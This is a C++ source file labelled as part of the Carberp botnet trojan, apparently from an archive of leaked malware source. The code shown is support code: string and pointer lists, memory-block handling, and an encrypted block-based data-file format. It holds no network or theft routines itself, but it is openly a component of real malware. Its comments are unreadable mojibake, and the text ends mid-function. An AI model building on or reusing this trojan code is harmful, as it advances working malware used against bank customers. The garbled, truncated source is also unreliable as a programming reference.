/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#include <windows.h>

#include "BotClasses.h"
#include "wincrypt.h"




//*****************************************************************************
//                              TBotList
//*****************************************************************************
TBotList::TBotList()
	: TCustomList()
{
	OnDelete = NULL;
}

TBotList::~TBotList()
{
	// �.�. ����������� ����� �� ��������� "���������"
	// ������� ����������� ����� � ����������� ��
	// ��������� ������� ������� ������ � � ����������� �������
    Clear();
}

void TBotList::DoDelete(void* Item)
{
	if (OnDelete) OnDelete(this, Item);
}




//*****************************************************************************
//                              TBotStrings
//*****************************************************************************

void StringsDestroyItem(TBotList*, void* Item)
{
	// ������� ���������� ������
    delete (string*)Item;
}
//---------------------------------------------------

TBotStrings::TBotStrings()
{
	FItems.OnDelete = StringsDestroyItem;
	ValueDelimeter = "=";
}
//---------------------------------------------------

TBotStrings::~TBotStrings()
{

}
//---------------------------------------------------

int TBotStrings::PutStr(string *Str)
{
	// ������ ��������� ������
    return FItems.Add(Str);
}
//---------------------------------------------------

int TBotStrings::Add(const char* Value)
{
	return PutStr(new string(Value));
}
//---------------------------------------------------

int  TBotStrings::Add(const string& Value)
{
	return PutStr(new string(Value));
}
//---------------------------------------------------

string TBotStrings::MakeValueString(const char* Name, const char* Value)
{
	// ������� �������� ������ ���=��������
	DWORD Len = STRA::Length(Name) + ValueDelimeter.Length() + STRA::Length(Value);

	string Line(Len);
	Line += Name;
	Line += ValueDelimeter;
	Line += Value;
	return Line;
}
//---------------------------------------------------

int TBotStrings::AddValue(const char* Name, const char* Value)
{
	// ������� ��������� �������� � ������
	if (STRA::IsEmpty(Name))
		return -1;

	return Add(MakeValueString(Name, Value));
}
//---------------------------------------------------

int TBotStrings::AddValue(const char* Name, const string &Value)
{
    return AddValue(Name, Value.t_str());
}
//---------------------------------------------------

int TBotStrings::AddValue(const string &Name, const string &Value)
{
	return AddValue(Name.t_str(), Value.t_str());
}
//---------------------------------------------------

int TBotStrings::Count()
{
	return FItems.Count();
}
//---------------------------------------------------

void TBotStrings::Clear()
{
    FItems.Clear();
}
//---------------------------------------------------

void TBotStrings::Delete(int Index)
{
	FItems.Delete(Index);
}
//---------------------------------------------------

int TBotStrings::IndexOf(const char* Str)
{
	int Count = FItems.Count();
	for (int i = 0; i < Count; i++)
	{
		string &S = *(string*)FItems[i];
		if (S == Str)
			return i;
	}
	return -1;
}
//---------------------------------------------------

int TBotStrings::IndexOf(const string &Str)
{
	return IndexOf(Str.t_str());
}
//---------------------------------------------------

string TBotStrings::GetItem(int Index)
{
	string Item;

	string* Ptr = (string*)FItems[Index];
	if (Ptr)
		Item = *Ptr;

	return Item;
}
//---------------------------------------------------

void TBotStrings::SetItem(int Index, const char* Item)
{
	if (Index >= 0 && Index < FItems.Count())
		SetItem(Index, string(Item));
}

void TBotStrings::SetItem(int Index, const string &Item)
{
	if (Index >= 0 && Index < FItems.Count())
	{
		string &S = *(string*)FItems[Index];
		S = Item;
    }
}
//---------------------------------------------------

string TBotStrings::GetDelimetedText(const  char* Delimeter)
{
	// ������� �������� ��� ������� ������ � ������
	if (Count() == 0) return NULLSTR;

	string D = Delimeter;

	// ����������� ����� ����� ������
	DWORD Len = 0;
	int Count = FItems.Count();
	for (int i = 0; i < Count; i++)
	{
		string *S = (string*)FItems[i];
		Len += S->Length();
		// ��� ���� �����, ����� ��������� ��������� ������� �������� �
		// ����� ������
		if (i < Count - 1)
			Len += D.Length();
	}

	string Result(Len);

	// �������� ������
	for (int i = 0; i < Count; i++)
	{
		string *S = (string*)FItems[i];
		Result += *S;
		if (i < Count - 1)
			Result += D;
	}

	return Result;
}
//---------------------------------------------------

string TBotStrings::GetText()
{
	return GetDelimetedText("\r\n");
}
//---------------------------------------------------

void TBotStrings::SetText(const char* Text)
{
	// ������� ��������� ������������� ����� ��
	// ������ �����
	Clear();
	if (STRA::IsEmpty(Text)) return;


	PCHAR Start = (PCHAR)Text;
	PCHAR End;
	PCHAR Line;
	BYTE Flag;
	BYTE Ign;
	DWORD StrLen;
	while (1)
	{
		// ���� ����� ������
		End = Start;
		while (*End != 0 && *End != 10 && *End != 13) End++;

		// ��������� ������
		if (End != Text)
		{
			StrLen = End - Start;
			Line = (StrLen) ? Start : NULL;
			PutStr(new string(Line, StrLen));
        }

        if (*End == 0) break;

		// ��������� �� ��������� ������
		Flag = 0;
		while (*End != 0)
		{
			if (*End == 10)
				Ign = 1;
			else
			if (*End == 13)
				Ign = 2;
			else
				break;
			if ((Flag & Ign) != 0)
				break;

			Flag |= Ign;

			End++;
		}
		Start = End;
	}
		
}
//---------------------------------------------------

void TBotStrings::SetText(const string &Text)
{
	SetText(Text.t_str());
}
//---------------------------------------------------

void TBotStrings::SetDelimetedText(const char* Text, const char* Delimeter)
{
	Clear();
	if (STRA::IsEmpty(Text) || STRA::IsEmpty(Delimeter))
		return;
	DWORD DLen = STRA::Length(Delimeter);

	while (*Text)
	{
		int Pos = STRA::Pos(Text, Delimeter);
		if (Pos < 0)
		{
			Add(Text);
			return;
		}

		if (Pos > 0)
		{
			// ��������� �������
            string Item(Text, Pos);
            Add(Item);
		}

		Text += Pos;
        Text += DLen;
	}


}
//---------------------------------------------------

string TBotStrings::NameByIndex(int Index)
{
	// ������� ���������� ��� �� ������ � ��������
	string Name;

	DWORD Len = 0;

    string S = GetItem(Index);
	if (IsName(S, &Len, NULL))
	{
        Name.Copy(S, 0, Len);
    }


    return Name;
}
//---------------------------------------------------

string TBotStrings::ValueByIndex(int Index)
{
	// ������� ���������� �������� �� ������ �
	// ��������� ��������

	string Value;

	DWORD Start = 0;
	string S = GetItem(Index);

	if (IsName(S, NULL, &Start))
	{
        Value.Copy(S, Start, S.Length() - Start);
    }

	return Value;
}
//---------------------------------------------------

bool TBotStrings::IsName(const string& S, DWORD* NameEnd, DWORD* ValueStart)
{
	// ������� ���������� ������ ���� ������ ��������
	// ����� ��� ��������

	if (S.IsEmpty() || ValueDelimeter.IsEmpty())
		return false;

	int Pos = S.Pos(ValueDelimeter);
	bool IsName = Pos >= 0;

	if (IsName)
	{
		if (NameEnd)
			*NameEnd = Pos;
		if (ValueStart)
			*ValueStart = Pos + ValueDelimeter.Length();
    }

	return IsName;
}
//---------------------------------------------------

int TBotStrings::SearchName(const char* Name, string* Value)
{
	// ������� ���� ������� �������� � ������ Name;
	if (STRA::IsEmpty(Name)) return -1;

	for (int i = 0; i < FItems.Count(); i++)
	{
		string S = GetItem(i);
		DWORD NamePos  = 0;
		DWORD ValuePos = 0;
		if (!IsName(S, &NamePos, &ValuePos)) continue;

		if (STRA::CompareEx(S.t_str(), Name, NamePos) == 0)
		{
			if (Value)
				Value->Copy(S, ValuePos, S.Length() - ValuePos);
            return i;
		}
	}

	return -1;

}
//---------------------------------------------------

string TBotStrings::GetValue(const char* Name)
{
	// ������� ���������� �������� ��� ��������
	// � ��������� ������

    string Value;

	SearchName(Name, &Value);

	return Value;
}
//---------------------------------------------------

void TBotStrings::SetValue(const char* Name, const char* Value)
{
	// ������� ������������� �������� ��� ���������� �����
	if (STRA::IsEmpty(Name))
		return;
	int Pos = SearchName(Name, NULL);
	if (Pos < 0)
		AddValue(Name, Value);
	else
		SetItem(Pos, MakeValueString(Name, Value));
}
//---------------------------------------------------

void TBotStrings::SaveToStream(TBotStream* Stream)
{
	// ���� ���������� ����� ����� � ����� ������
	if (Stream)
	{
		string Buf = GetText();
		Stream->Write(Buf.t_str(), Buf.Length());
    }
}
//---------------------------------------------------

void TBotStrings::LoadFromStream(TBotStream* Stream)
{
	// ������� ��������� ������ �� ������ ������
	Clear();
	if (Stream)
	{
		string Buf = Stream->ReadToString();
		SetText(Buf);
    }
}
//---------------------------------------------------


/*----------------  ������ ��� ������ �� �������� ��������� -----------------*/

DWORD MaxListSize = 4000000;

typedef struct TListRec
{
	PDWORD Items;    // ������ ���������
	DWORD Count;     // ���������� ��������� � ������
	DWORD Capacity;  // ���������� ����������������� ���������
	TFreeItemMethod FreeMethod; // ����� ����������� ���������

} *PListRec;


PList List::Create()
{
	// ������� �������� ������
	PListRec Result = CreateStruct(TListRec);
	SetCapacity(Result, 32);
	return (PList)Result;
}
//----------------------------------------------------------------------------


void List::Free(PList List)
{
    // ������� ����������� ������
 if (List == NULL)
		return;

	List::Clear(List);
	FreeStruct(List);
}
//----------------------------------------------------------------------------

void List::Clear(PList List)
{
	// ������� ������� ������
	if (List == NULL)
		return;
	PListRec LR = (PListRec)List;

	// ���������� ��������
	if (LR->FreeMethod != NULL)
	{
		DWORD i;
		LPVOID Item;
		for (i = 0; i < LR->Count; i++)
		{
			Item = (LPVOID)LR->Items[i];
			if (Item != NULL)
                LR->FreeMethod(Item);
		}
	}
    // ������� ������
	HEAP::Free(LR->Items);
	LR->Items = NULL;
	LR->Capacity = 0;
	LR->Count = 0;
}
//----------------------------------------------------------------------------

DWORD List::Count(PList List)
{
	// ������� ���������� ���������� ��������� ������
	if (List == NULL)
		return 0;
	else
		return ((PListRec)List)->Count;

}
//----------------------------------------------------------------------------

bool ListUpdateCapacity(PListRec List)
{
	// �������� ������ ���������� ������

	// ����������� ��������� ���������� ������
	DWORD Delta;
	if (List->Capacity > 64)
		Delta = List->Capacity / 4;
	else
	if (List->Capacity > 8)
		Delta = 16;
	else
		Delta = 4;

	// ������������� ����� ������
    return List::SetCapacity((PList)List, List->Capacity + Delta);
}
//----------------------------------------------------------------------------

bool List::SetCapacity(PList List, DWORD Value)
{
	// �������� ������ ������������������ ���������
	if (List == NULL || Value > MaxListSize)
		return false;

	PListRec LR = (PListRec)List;
	if (Value > LR->Count && Value != LR->Capacity)
	{
        // ������ ����� �����
		if (HEAP::ReAlloc2((LPVOID &)LR->Items, Value * sizeof(LPVOID)))
		{
			LR->Capacity = Value;
			return true;
        }
	}
	return false;
}
//----------------------------------------------------------------------------

int List::Add(PList List, LPVOID Item)
{
	// ������� ��������� ����� �������
	if (List == NULL)
		return -1;
	PListRec LR = (PListRec)List;

	if (LR->Count == LR->Capacity)
		if (!ListUpdateCapacity(LR))
			return -1;

	DWORD Result = LR->Count;
	LR->Count++;
	LR->Items[Result] = (DWORD)Item;
	return Result;
}
//----------------------------------------------------------------------------

void List::Delete(PList List, DWORD Index)
{
	// ������� ������� ������� �� ������
	if (List == NULL || Index >= ((PListRec)List)->Count)
		return;

	PListRec LR = (PListRec)List;
    LPVOID Temp = (LPVOID)LR->Items[Index];

	LR->Count--;
	if (Index < LR->Count)
	{
		// ��������� ���� ������ ����������� �� �������� ���������
		PDWORD Dest = LR->Items;
		Dest += Index;
		PDWORD Source = Dest;
		Source++;
        m_memcpy(Dest, Source, (LR->Count - Index)*sizeof(PDWORD));
	}
	// ��� ������������� ���������� �������
	if (Temp != NULL && LR->FreeMethod != NULL)
		LR->FreeMethod(Temp);

}
//----------------------------------------------------------------------------

// ������� �������
 LPVOID List::Extract(PList List, DWORD Index)
 {
	// �������  ��������� ������� �� ������ �� ��������� ���
    PListRec LR = (PListRec)List;
	if (List == NULL || Index >= LR->Count)
		return NULL;

	LPVOID Temp = (LPVOID)LR->Items[Index];
	LR->Items[Index] = 0;
	Delete(List, Index);
	return Temp;
 }

//----------------------------------------------------------------------------

int List::Remove(PList List, LPVOID Item)
{
	// ������� �� ������ �������
	int Index = IndexOf(List, Item);
	if (Index >= 0)
		Delete(List, Index);
    return Index;
}
//----------------------------------------------------------------------------

int List::IndexOf(PList List, LPVOID Item)
{
	// ������� ���������� ������� �������� � ������
	if (List == NULL)
		return -1;

    PListRec LR = (PListRec)List;
	DWORD Index;
	for (Index = 0; Index < LR->Count; Index++)
		if ((LPVOID)LR->Items[Index] == Item)
			return Index;
	return -1;
}
//----------------------------------------------------------------------------


void List::SetItem(PList List, DWORD Index, LPVOID Item)
{
	// ������� ������������� �������� �������� � ��������� ������� Index
	if (List == NULL || Index >= ((PListRec)List)->Count)
		return;
    PListRec LR = (PListRec)List;

	LPVOID Old = (LPVOID)LR->Items[Index];
	LR->Items[Index] = (DWORD)Item;
	if (Old != NULL && LR->FreeMethod != NULL)
		LR->FreeMethod(Old);
}
//----------------------------------------------------------------------------

LPVOID List::GetItem(PList List, DWORD Index)
{
	// ������� ���������� �������� �������� �� ������� Index
	if (List == NULL || Index >= ((PListRec)List)->Count)
		return NULL;

    return (LPVOID)((PListRec)List)->Items[Index];
}
//----------------------------------------------------------------------------

void List::SetFreeItemMehod(PList List, TFreeItemMethod Method)
{
	// ���������� ����� ��������������� �������� ���������
	if (List != NULL)
		((PListRec)List)->FreeMethod = Method;
}
//----------------------------------------------------------------------------

LPVOID List::Last(PList List)
{
	// ������� ���������� ��������� ������� ������
	if (List == NULL) return NULL;
    return List::GetItem(List, List::Count(List) - 1);
}
//----------------------------------------------------------------------------

void List::CopyFrom(PList Destination, PList Source)
{
	// ������� �������� �������� �� ������ Source � ������ Destination
	if (Destination == NULL || Source == NULL)
		return;

	for (DWORD i = 0; i < Count(Source); i++)
    {
    	Add(Destination, GetItem(Source, i));
	}
}


// ----------------------------------------------------------------------------
//
//  ����� ������� ��� ������ �� �������� ����� Strings
//
// ----------------------------------------------------------------------------

typedef struct TStringsRec
{
	PList Items;
	PCHAR LineDelimeter;
	PCHAR ValueDelimeter;

} *PStringsRec;


PStrings Strings::Create()
{
	// ������� ����� �����
	PStringsRec Rec = CreateStruct(TStringsRec);

	Rec->Items = List::Create();
	List::SetFreeItemMehod(Rec->Items, (TFreeItemMethod)STR::Free);

	Rec->LineDelimeter = STR::New("\r\n");
	Rec->ValueDelimeter = STR::New("=");

	return (PStrings)Rec;
}
// ----------------------------------------------------------------------------

void Strings::Free(PStrings Strings)
{
	// ���������� ����� �����
	if (Strings == NULL)
		return;

	List::Free(PStringsRec(Strings)->Items);
	STR::Free(PStringsRec(Strings)->LineDelimeter);
	STR::Free(PStringsRec(Strings)->ValueDelimeter);

	FreeStruct(Strings);
}
// ----------------------------------------------------------------------------

void Strings::Clear(PStrings Strings)
{
	// �������� ����� �����
	if (Strings != NULL)
		List::Clear(PStringsRec(Strings)->Items);
}
// ----------------------------------------------------------------------------

DWORD Strings::Count(PStrings Strings)
{
	// �������� ���������� �����
	if (Strings == NULL)
		return 0;
	return List::Count(PStringsRec(Strings)->Items);
}
// ----------------------------------------------------------------------------

int Strings::Add(PStrings Strings, PCHAR Str, bool Duplicate)
{
	// �������� ����� ������
	if (Strings == NULL)
		return -1;
	PCHAR Tmp;
	if (Duplicate)
		Tmp = STR::New(Str);
	else
		Tmp = Str;
	return List::Add(PStringsRec(Strings)->Items, (LPVOID)Tmp);
}
// ----------------------------------------------------------------------------

void Strings::Delete(PStrings Strings, DWORD Index)
{
	// ������� ������
	if (Strings == NULL)
		return;

	List::Delete(PStringsRec(Strings)->Items, Index);
}
// ----------------------------------------------------------------------------

int Strings::Remove(PStrings Strings, PCHAR Str)
{
	// ������� ������� ������ Str �� ������
	int Index = IndexOf(Strings, Str);
	if (Index >= 0)
		Delete(Strings, Index);
	return Index;
}
// ----------------------------------------------------------------------------

int Strings::IndexOf(PStrings Strings, PCHAR Str)
{
    // ������� ���������� ������� ������ Str � ������
	if (Strings == NULL) return -1;
	PStringsRec R = (PStringsRec)Strings;

	int Count = List::Count(R->Items);

	for (int i = 0; i < Count; i++)
	{
		PCHAR S = (PCHAR)List::GetItem(R->Items, i);
		if (StrSame(S, Str, true))
        	return i;
	}
	return -1;
}
// ----------------------------------------------------------------------------

PCHAR Strings::GetItem(PStrings Strings, DWORD Index, bool DuplicateStr)
{
	// ������� ������ �� �������

	if (Strings == NULL)
		return NULL;
	PCHAR Str = (PCHAR)List::GetItem(PStringsRec(Strings)->Items, Index);
	if (DuplicateStr)
		return STR::New(Str);
	else
		return Str;
}
// ----------------------------------------------------------------------------

PCHAR Strings::GetText(PStrings Strings, PCHAR LineDelimeter)
{
	// ���������� ��� ������ � ����. ���� �� ������
	// ����������� �� ����������� ����������� �������� � ����������
	if (Strings == NULL)
		return NULL;

	PStringsRec SR = (PStringsRec)Strings;

	DWORD Count = List::Count(SR->Items);
	if (Count == 0)
		return NULL;

	// �������������� ����������� �����
	PCHAR Del;
	DWORD DelLen;

	if (LineDelimeter != NULL)
	{
		Del = LineDelimeter;
		DelLen = StrCalcLength(Del);
	}
	else
	{
		Del = SR->LineDelimeter;
		DelLen = STR::Length(Del);
	}

	PCHAR S;
	DWORD TotalLen = 0;
	DWORD i;

	// ���������� ����� ������
	for (i = 0; i < Count; i++)
	{
		S = (PCHAR)List::GetItem(SR->Items, i);
		TotalLen += STR::Length(S);
		if (i < (Count - 1))
			TotalLen += DelLen;
	}

	// �������� ������
	DWORD L;
	PCHAR Result = STR::Alloc(TotalLen);

	PCHAR Temp = Result;

	for (i = 0; i < Count; i++)
	{
		S = (PCHAR)List::GetItem(SR->Items, i);
		L = STR::Length(S);

		m_memcpy(Temp, S, L);
		Temp += L;

		if (i < (Count - 1))
		{
			m_memcpy(Temp, Del, DelLen);
			Temp += DelLen;
		}
	}

	return Result;
}

//----------------------------------------------------------------------------

void Strings::SetText(PStrings Strings, PCHAR Text)
{
	// ������� ��������� ����� �� ������ ���������� ��������� �����
	// ������ � �������� �������

	if (Strings == NULL || Text == NULL)
		return;
	PStringsRec SR = (PStringsRec)Strings;
	// ������� ������
	List::Clear(SR->Items);

	//������ �����
	PCHAR Start = Text;
	PCHAR End;
	PCHAR Line;
	BYTE Flag;
	BYTE Ign;
	DWORD StrLen;
	while (*Start != 0)
	{
		// ���� ����� ������
		End = Start;
		while (*End != 0 && *End != 10 && *End != 13) End++;

		// ������ ������
		StrLen = End - Start;
		if (StrLen != 0)
			Line = STR::New(Start, StrLen);
		else
			Line = NULL;
		List::Add(SR->Items, Line);

		// ��������� �� ��������� ������
		Flag = 0;
		while (*End != 0)
		{
			if (*End == 10)
				Ign = 1;
			else
			if (*End == 13)
				Ign = 2;
			else
				break;
			if ((Flag & Ign) != 0)
				break;

			Flag = Flag | Ign;

			End++;
		}
		Start = End;
	}
}
//----------------------------------------------------------------------------

int Strings::AddValue(PStrings Strings, PCHAR Name, PCHAR Value, PCHAR Delimeter)
{
	// �������� � ������ ���� ���=��������.
	// ���� �� ������ ����������� �� ����� ���� �� �������� ������ (�� ��������� =)

	if (Strings == NULL || Name == NULL)
		return NULL;

	PStringsRec SR = (PStringsRec)Strings;

	PCHAR Del = Delimeter;
	if (Del == NULL)
		Del = SR->ValueDelimeter;

	return List::Add(SR->Items, STR::New(3, Name, Del, Value));
}




//---------------------------------------------------------------------------
//  MEMBLOCKS - ������� ��� ������ � ������� ������, �������� ������
//---------------------------------------------------------------------------
PMemBlockList MEMBLOCK::CreateList()
{
	// ������� ������ ������
	PMemBlockList List = List::Create();
	List::SetFreeItemMehod(List, (TFreeItemMethod)FreeBlock);
    List::SetCapacity(List, 64);
	return List;
}

void MEMBLOCK::FreeList(PMemBlockList List)
{
	// ���������� ������ ������
	List::Free(List);
}


void MEMBLOCK::FreeBlock(PMemBlock Block)
{
	// ���������� ���� ������
	if (Block == NULL) return;
	MemFree(Block->Data);
    FreeStruct(Block);
}

PMemBlock MEMBLOCK::AddBlock(PMemBlockList List, LPVOID Data, DWORD DataSize, bool Copy)
{
    // �������� ����� ���� � ������
	if (List == NULL || Data == NULL || DataSize == 0)
		return NULL;

	PMemBlock Block = CreateStruct(TMemBlock);
	if (Block == NULL) return NULL;

	if (Copy)
	{
		Block->Data = MemAlloc(DataSize);
		if (Block->Data == NULL)
		{
			FreeStruct(Block);
			return NULL;
        }
		m_memcpy(Block->Data, Data, DataSize);
	}
	else
		Block->Data = Data;
	Block->Size = DataSize;
	List::Add(List, Block);
	return Block;
}

DWORD MEMBLOCK::Size(PMemBlockList List)
{
	// ������� ������������ ����� ������ ������ ���� ������ ������
	if (List == NULL) return 0;
	DWORD Sz = 0;
	DWORD Count = List::Count(List);
	for (DWORD i = 0; i < Count; i++)
	{
		PMemBlock B = (PMemBlock)List::GetItem(List, i);
        Sz += B->Size;
	}
    return Sz;
}

void MEMBLOCK::BuildToBuf(PMemBlockList List, LPVOID Buf)
{
	// ������� �������� ������ ���� ������ � ����� Buf.
	// ���������������, ��� Buf ����� �������� � ���� ��� �����
    if (List == NULL || Buf == NULL) return;

	DWORD Count = List::Count(List);
	if (Count == 0) return;

	PCHAR Temp = (PCHAR)Buf;

	for (DWORD i = 0; i < Count; i++)
	{
		PMemBlock Block = (PMemBlock)List::GetItem(List, i);
		m_memcpy(Temp, Block->Data, Block->Size);
		Temp += Block->Size;
	}
}


PCHAR MEMBLOCK::BuildAsStr(PMemBlockList List, DWORD *TotalSize)
{
	// ������� �������� ��� ����� � ������
	DWORD StrSize = Size(List);
	if (TotalSize != NULL)
		*TotalSize = StrSize;
	if (StrSize == 0) return NULL;

	PCHAR Str = STR::Alloc(StrSize);
    BuildToBuf(List, Str);
    return Str;
}

// ������� �������� ��� ����� � ������
LPVOID MEMBLOCK::BuildAsMem(PMemBlockList List, DWORD *TotalSize)
{
	DWORD BufSize = Size(List);
	if (TotalSize != NULL)
		*TotalSize = BufSize;
	if (BufSize == 0) return NULL;

	// ��� ������������� � ��������� ��������� ����� � ����� ������ �������
	// �������������� ����
	LPVOID Buf = MemAlloc(BufSize + 1);
	BuildToBuf(List, Buf);
	*((PCHAR)Buf + BufSize) = 0;
	return Buf;
}


PMemBlock MEMBLOCK::Pack(PMemBlockList List)
{
	// ������� ���������� ����� � ����
	DWORD Count = List::Count(List);
	if (Count == 0) return NULL;

	if (Count > 1)
	{
		DWORD Size = 0;
		LPVOID Mem = BuildAsMem(List, &Size);
		List::Clear(List);
        MEMBLOCK::AddBlock(List, Mem, Size, false);
	}
	return (PMemBlock)List::GetItem(List, 0);
}

PMemBlock MEMBLOCK::GetBlockByID(PMemBlockList List, DWORD ID)
{
	// �������� ���� �� ��������������
	if (List == NULL)
		return NULL;

	for (DWORD i = 0; i < List::Count(List); i++)
    {
		PMemBlock Block = (PMemBlock)List::GetItem(List, i);
		if (Block == NULL)
			continue;
		if (Block->ID == ID)
			return Block;
	}

	return NULL;
}

PCHAR MEMBLOCK::GetBlockByAsStr(PMemBlockList List, DWORD ID)
{
	// �������� ���� ��� ������
	PMemBlock Block = GetBlockByID(List, ID);
	if (Block != NULL)
		return STR::New((PCHAR)Block->Data, Block->Size);
	else
		return NULL;
}

bool MEMBLOCK::ContainBlock(PMemBlockList List, DWORD ID)
{
	// ������� ������ ������ ���� � ������ ���� ���� � ��������� ���������������
	return GetBlockByID(List, ID) != NULL;
}

//---------------------------------------------------------------------------
//  DataFile - ������ ��� ������ � ������� �������
//---------------------------------------------------------------------------

#pragma pack(push, 1)
// ��������� ����� ������
typedef struct TDataBlockHead
{
	DWORD Signature;
	DWORD ID;
	DWORD Size;
}*PDataBlockHead;
#pragma pack(pop)

// ��������� �����, ��������� ����� ������
#define DATA_BLOCK_SIGNATURE  0x40F714CE



PDataFile DataFile::CreateDataFile(PCHAR FileName, DWORD Signature)
{
	// ������� ������ ���� � ������ FileName, ������ ��������� ��������
	// ����� �� ��� ���� ������ � ���� �� ����������
	HANDLE File	= (HANDLE)::pCreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (File == INVALID_HANDLE_VALUE)
		return NULL;

	PDataFile Rec = CreateStruct(TDataFileRec);
	if (Rec == NULL)
	{
		pCloseHandle(File);
		return NULL;
	}

	// �������������� ��������� �����
    Rec->FileName = STR::New(FileName);
	Rec->Handle = File;
    Rec->Blocks = MEMBLOCK::CreateList();

	Rec->Head.Signature = Signature;
	Rec->Head.Version   = DATA_FILE_VERSION;

	return Rec;
}

PDataFile DataFile::OpenFile(PCHAR FileName, DWORD Signature)
{
	// ������� ��������� ���� ��� ������ � ������ �� ���� ���������
	HANDLE Handle	= (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (Handle == INVALID_HANDLE_VALUE)
		return NULL;

	PDataFile File = CreateStruct(TDataFileRec);
	if (File == NULL)
	{
		pCloseHandle(Handle);
		return NULL;
	}

    File->Handle = Handle;

	// ������ ��������� �����
	DWORD Readed = 0;
	pReadFile(Handle, &File->Head, sizeof(File->Head), &Readed, NULL);
	if (Readed != sizeof(File->Head) ||
		File->Head.Version > DATA_FILE_VERSION ||
		(Signature != 0 && File->Head.Signature != Signature))
	{
		pCloseHandle(Handle);
		FreeStruct(File);
		return NULL;
	}

	return File;
}

void DataFile::CloseFile(PDataFile File)
{
	// ������� ��������� ���� � ���������� ��������� File
	if (File == NULL) return;

	if (File->Handle != NULL)
		pCloseHandle(File->Handle);

    STR::Free(File->FileName);

	// ����������� ������ ���������
	MEMBLOCK::FreeList(File->Blocks);
    FreeStruct(File);
}

bool DataFile::WriteDataFile(PDataFile File)
{
	// ���������� ������ �� ��������� File � ���������� ����
	if (File == NULL || File->Handle == NULL) return false;

	DWORD Size = sizeof(File->Head);
	DWORD Written = 0;
	pWriteFile(File->Handle, &File->Head, Size, &Written, NULL);
	if (Written != Size) return false;

	return WriteBlocksToFile(File);
}

// ������ ������ �� ����������� ����� � ��������� File
bool DataFile::ReadDataFile(PDataFile File)
{
	// ������ ����� ������
	if (File == NULL || File->Handle == NULL)
		return false;

	return !ReadBlocksFromFile(File);
}


void DataFile::AddDataBlock(PDataFile File, DWORD BlockID, LPVOID Data, DWORD DataSize, bool Copy)
{
	// �������� ���� ������
	if (File == NULL) return;

	// ��� ���������� ����� ������ �� ����� ������������ �������
	// MEMBLOCK::AddBlock ��� ��� �� ���������� ������ �����, � ���
	// � ����� ������ ����� �� ����������

	PMemBlock Block = CreateStruct(TMemBlock);
	if (Block == NULL) return;
	Block->ID = BlockID;
	Block->Size = DataSize;

	if (Copy)
	{
		Block->Data = MemAlloc(DataSize);
		if (Block->Data == NULL)
		{
			FreeStruct(Block);
			return;
        }
		m_memcpy(Block->Data, Data, DataSize);
	}
	else
		Block->Data = Data;

    List::Add(File->Blocks, Block);
}

void DataFile::AddDataBlock(PDataFile File, DWORD BlockID, PCHAR StrData)
{
	DWORD Size = StrCalcLength(StrData);
    AddDataBlock(File, BlockID, StrData, Size, true);
}



LPVOID CryptBlockData(PMemBlock Block, LPVOID Key, TCryptMethod Method, PDWORD OutSize)
{
	// ����������� ���� ������, ������� ��������� ������ ����� ������������
	if (Block == NULL || Block->Size == 0 || Block->Data == NULL ||
		Key == NULL || Method == NULL)
		return NULL;

	LPVOID NewBuf = MemAlloc(Block->Size);
	if (NewBuf == NULL) return NULL;

    *OutSize = Block->Size;
	m_memcpy(NewBuf, Block->Data, Block->Size);
	if (!Method(Key, (LPBYTE)NewBuf, Block->Size, OutSize))
	{
		MemFree(NewBuf);
		NewBuf = NULL;
    }
	return NewBuf;
}

bool DataFile::WriteBlocksToFile(PDataFile File)
{
	// �������� ����� ������ � ����
	if (File == NULL || File->Handle == NULL) return false;

	// ���������� ����� ������ � ����
	DWORD Count = List::Count(File->Blocks);

	TDataBlockHead BH;
	BH.Signature = DATA_BLOCK_SIGNATURE;

	DWORD WriteSize;
	DWORD WrittenSize;
	LPVOID Buf;
	bool FreeBuf;

    bool Result = true;

	for (DWORD i = 0; i < Count; i++)
	{
		PMemBlock Block = (PMemBlock)List::GetItem(File->Blocks, i);
		if (Block == NULL) continue;

		// �������������� ���������
		BH.ID   = Block->ID;
		BH.Size = Block->Size;

		// ���������� ���������
		WriteSize = sizeof(BH);
		pWriteFile(File->Handle, &BH, WriteSize, &WrittenSize, NULL);
		if (WriteSize != WrittenSize)
		{
			Result = false;
			break;
		}

		// ���������� ������
		FreeBuf = false;
		Buf = NULL;
		WriteSize = BH.Size;

		if (File->CryptMode == fcBlock)
			Buf = CryptBlockData(Block, File->CryptKey, File->CryptMethod, &WriteSize);

		if (Buf != NULL)
			FreeBuf = true;
		else
			Buf =  Block->Data;


		pWriteFile(File->Handle, Buf, WriteSize, &WrittenSize, NULL);

		if (FreeBuf)
			MemFree(Buf);

		if (WriteSize != WrittenSize)
		{
			Result = false;
			break;
		}
	}
	return Result;
}


bool DataFile::ReadBlocksFromFile(PDataFile File)
{
	// �������� ����� ������ � ����
	if (File == NULL || File->Handle == NULL)
		return false;

	if (File->Blocks == NULL)
		File->Blocks = MEMBLOCK::CreateList();

	bool Error = false;
	DWORD Size;
	DWORD Readed;
    TDataBlockHead BH;
	while (1)
	{
		// ������ ��������� �����
		Size =sizeof(BH);
		pReadFile(File->Handle, &BH, Size, &Readed, NULL);
		if (Readed != Size || BH.Signature != DATA_BLOCK_SIGNATURE)
		{
			Error = Readed != 0 || BH.Signature != DATA_BLOCK_SIGNATURE;
            break;
		}

		// ������ ������
		if (BH.Size != 0)
		{
			LPVOID Buf = MemAlloc(BH.Size);
			if (Buf == NULL)
			{
				Error = true;
				break;
			}

			pReadFile(File->Handle, Buf, BH.Size, &Readed, NULL);
			if (Readed != BH.Size)
			{
				MemFree(Buf);
				Error = true;
				break;
			}

			// �������������� ������
			if (File->CryptMode == fcBlock && File->DecryptMethod != NULL)
				if (!File->DecryptMethod(File->CryptKey, (LPBYTE)Buf, BH.Size, &BH.Size))
				{
					MemFree(Buf);
					Error = true;
					break;
                }


			AddDataBlock(File, BH.ID, Buf, BH.Size, false);
		}
	}

	// � ������ ������ ������ ������� ������
	if (Error)
		List::Clear(File->Blocks);

    return !Error;
}

bool DataFile::CryptBlocks(PMemBlockList Blocks, LPVOID Key, TCryptMethod Method)
{
	// ����������� ����� ������
	if (Blocks == NULL || Key == NULL || Method == NULL)
		return false;

	DWORD Count = List::Count(Blocks);
	for (DWORD i = 0; i < Count; i++)
